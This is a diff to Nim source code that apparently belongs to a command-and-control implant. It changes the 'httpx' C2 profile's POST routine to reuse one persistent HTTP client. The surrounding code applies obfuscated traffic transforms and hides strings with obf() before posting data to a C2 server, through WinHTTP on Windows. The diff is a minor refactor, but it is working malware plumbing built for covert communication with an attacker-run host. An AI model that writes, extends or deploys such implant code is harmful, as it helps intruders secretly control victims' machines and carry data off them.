@@ -1,5 +1,6 @@
 import std/[base64, strutils, json, tables, uri, sequtils]
 import http_client
+export http_client  # Re-export so httpx profile can use HttpClientWrapper
 import debug
 import strenc
 
@@ -190,8 +191,9 @@ proc applyServerTransforms(data: seq[byte], transforms: JsonNode): seq[byte] =
     else:
       debug "[DEBUG] Unknown server transform: ", action
 
-proc httpxPost*(url: string, body: string, postConfig: JsonNode): string =
+proc httpxPost*(url: string, body: string, postConfig: JsonNode, client: HttpClientWrapper): string =
   ## Make HTTP POST request using raw_c2_config with transforms and message locations
+  ## Uses a persistent client instance to avoid resource exhaustion
   
   var requestData = cast[seq[byte]](body)
   
@@ -200,8 +202,7 @@ proc httpxPost*(url: string, body: string, postConfig: JsonNode): string =
     requestData = applyClientTransforms(body, postConfig[obf("client")][obf("transforms")])
     debug "[DEBUG] Request data after transforms: ", requestData.len, " bytes"
   
-  # Create HTTP client using our custom wrapper (WinHTTP on Windows, httpclient on Linux)
-  var client = newClientWrapper()
+  # Use the provided persistent client instead of creating a new one
   
   # Add client headers if present
   if postConfig.hasKey(obf("client")) and postConfig[obf("client")].hasKey(obf("headers")):
